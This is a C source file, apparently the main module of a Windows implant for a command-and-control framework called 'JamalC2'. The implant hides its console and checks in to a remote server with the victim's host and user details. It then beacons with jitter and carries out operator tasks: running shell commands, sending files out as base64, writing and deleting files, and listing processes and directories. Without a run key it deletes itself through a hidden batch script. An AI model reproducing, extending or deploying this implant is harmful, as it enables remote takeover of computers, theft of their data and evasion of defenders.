/*
 * JamalC2 Implant - Main Entry Point
 * C/C++ Implementation
 */

// Windows subsystem (no console in release)
#ifdef NDEBUG
#pragma comment(linker, "/SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup")
#endif

// Windows headers must come first
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

// Standard library
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Project headers
#include "config.h"
#include "crypto.h"
#include "files.h"
#include "http.h"
#include "process.h"
#include "protocol.h"
#include "shell.h"
#include "utils.h"

// Global crypto context
static CryptoContext g_crypto;

// Global beacon interval (can be changed by server command)
static int g_beacon_interval = HEARTBEAT_INTERVAL;

// Self-delete function
static void self_delete(void) {
  char batch_path[MAX_PATH];
  char exe_path[MAX_PATH];
  char batch_content[1024];
  FILE *f;

  GetModuleFileNameA(NULL, exe_path, MAX_PATH);
  GetTempPathA(MAX_PATH, batch_path);
  strcat(batch_path, "cleanup.bat");

  snprintf(batch_content, sizeof(batch_content),
           "@echo off\n"
           ":retry\n"
           "del \"%s\" > nul 2>&1\n"
           "if exist \"%s\" (ping -n 1 127.0.0.1 > nul && goto retry)\n"
           "del \"%%~f0\"\n",
           exe_path, exe_path);

  f = fopen(batch_path, "w");
  if (f) {
    fputs(batch_content, f);
    fclose(f);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    char cmd[MAX_PATH + 16];
    snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", batch_path);
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL,
                   &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
  }
}

// Handle a single task
static void handle_task(Task *task) {
  char *result = NULL;
  int success = 1;

  switch (task->command) {
  case CMD_SHELL:
    result = shell_execute(task->args);
    if (!result) {
      result = safe_strdup("Command execution failed");
      success = 0;
    }
    break;

  case CMD_DOWNLOAD:
    result = files_read_base64(task->args);
    if (!result) {
      result = safe_strdup("File not found or read failed");
      success = 0;
    }
    break;

  case CMD_UPLOAD: {
    // args format: "path|base64content"
    char *sep = strchr(task->args, '|');
    if (sep) {
      *sep = '\0';
      if (files_write_base64(task->args, sep + 1) == 0) {
        result = safe_strdup("File uploaded successfully");
      } else {
        result = safe_strdup("File upload failed");
        success = 0;
      }
    } else {
      result = safe_strdup("Invalid upload format");
      success = 0;
    }
    break;
  }

  case CMD_PROCESS:
    result = process_list();
    if (!result) {
      result = safe_strdup("Failed to get process list");
      success = 0;
    }
    break;

  case CMD_SYSINFO: {
    SystemInfo info;
    protocol_get_sysinfo(&info);
    // Format as JSON
    size_t len = 512;
    result = safe_malloc(len);
    snprintf(result, len,
             "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"%s\",\"ip\":\"%"
             "s\",\"tag\":\"%s\"}",
             info.hostname ? info.hostname : "",
             info.username ? info.username : "",
             info.os_version ? info.os_version : "",
             info.ip_address ? info.ip_address : "", info.tag ? info.tag : "");
    protocol_free_sysinfo(&info);
    break;
  }

  case CMD_DIRLIST: {
    // List directory contents
    // 当 args 为空时传递空字符串以获取驱动器列表
    const char *dir_path = task->args ? task->args : "";
    result = files_list_dir(dir_path);
    if (!result) {
      result = safe_strdup("[]");
    }
    break;
  }

  case CMD_EXIT:
    protocol_send_result(&g_crypto, task->id, 1, "Exiting");
    ExitProcess(0);
    break;

  case CMD_INTERVAL: {
    // Set new beacon interval
    int new_interval = atoi(task->args);
    if (new_interval > 0) {
      g_beacon_interval = new_interval;
      char msg[64];
      snprintf(msg, sizeof(msg), "Beacon interval set to %d seconds",
               new_interval);
      result = safe_strdup(msg);
      DEBUG_PRINT("    [*] Beacon interval changed to %d seconds\n",
                  new_interval);
    } else {
      result = safe_strdup("Invalid interval");
      success = 0;
    }
    break;
  }

  case CMD_DELETE: {
    // Delete file
    if (task->args && strlen(task->args) > 0) {
      if (DeleteFileA(task->args)) {
        result = safe_strdup("File deleted successfully");
      } else {
        result = safe_strdup("Failed to delete file");
        success = 0;
      }
    } else {
      result = safe_strdup("No file path specified");
      success = 0;
    }
    break;
  }

  default:
    result = safe_strdup("Unknown command");
    success = 0;
    break;
  }

  // Send result back
  if (result) {
    DEBUG_PRINT(
        "    [DEBUG] Sending result for task %s: success=%d, output_len=%zu\n",
        task->id, success, strlen(result));
    int send_ret = protocol_send_result(&g_crypto, task->id, success, result);
    DEBUG_PRINT("    [DEBUG] Send result returned: %d\n", send_ret);
    free(result);
  } else {
    DEBUG_PRINT("    [DEBUG] No result to send for task %s\n", task->id);
  }
}

// Main beacon loop
static void beacon_loop(void) {
  while (1) {
    Task *tasks = NULL;
    int task_count = 0;

    // Get tasks from server
    int beacon_ret = protocol_beacon(&g_crypto, &tasks, &task_count);
    DEBUG_PRINT("    [DEBUG] beacon_ret=%d, task_count=%d\n", beacon_ret,
                task_count);

    if (beacon_ret == 0 && task_count > 0) {
      // Process each task
      for (int i = 0; i < task_count; i++) {
        DEBUG_PRINT("    [DEBUG] Processing task %d: id=%s, cmd=%d, args=%s\n",
                    i, tasks[i].id, tasks[i].command,
                    tasks[i].args ? tasks[i].args : "(null)");
        handle_task(&tasks[i]);
      }
      protocol_free_tasks(tasks, task_count);
    }

    // Sleep with jitter (using dynamic beacon interval)
    sleep_with_jitter(g_beacon_interval, JITTER_PERCENT);
  }
}

int main(int argc, char *argv[]) {
  DEBUG_PRINT("[*] JamalC2 C Implant starting...\n");

#if !SKIP_KEY_CHECK
  // Validate run key
  if (argc < 3 || strcmp(argv[1], "-k") != 0 || strcmp(argv[2], RUN_KEY) != 0) {
    DEBUG_PRINT("[!] Invalid key, exiting...\n");
    self_delete();
    return 0;
  }
  DEBUG_PRINT("[+] Key validated\n");
#endif

  // Initialize crypto
  DEBUG_PRINT("[*] Initializing crypto...\n");
  if (crypto_init(&g_crypto, ENCRYPTION_KEY) != 0) {
    DEBUG_PRINT("[!] Crypto init failed\n");
    return 1;
  }
  DEBUG_PRINT("[+] Crypto initialized\n");

  // Initialize HTTP
  DEBUG_PRINT("[*] Initializing HTTP...\n");
  if (http_init() != 0) {
    DEBUG_PRINT("[!] HTTP init failed\n");
    return 1;
  }
  DEBUG_PRINT("[+] HTTP initialized\n");

  // Initial checkin
  DEBUG_PRINT("[*] Getting system info...\n");
  SystemInfo info;
  protocol_get_sysinfo(&info);
  DEBUG_PRINT("[+] System info: %s@%s\n", info.username, info.hostname);

  DEBUG_PRINT("[*] Attempting checkin to %s:%d...\n", SERVER_HOST, SERVER_PORT);
  int checkin_result = protocol_checkin(&g_crypto, &info);
  if (checkin_result != 0) {
    DEBUG_PRINT("[!] Checkin failed (code: %d), retrying in %d seconds...\n",
                checkin_result, RECONNECT_DELAY);
    Sleep(RECONNECT_DELAY * 1000);
  } else {
    DEBUG_PRINT("[+] Checkin successful!\n");
  }

  protocol_free_sysinfo(&info);

  // Enter beacon loop
  DEBUG_PRINT("[*] Entering beacon loop...\n");
  beacon_loop();

  // Cleanup (never reached)
  http_cleanup();
  return 0;
}
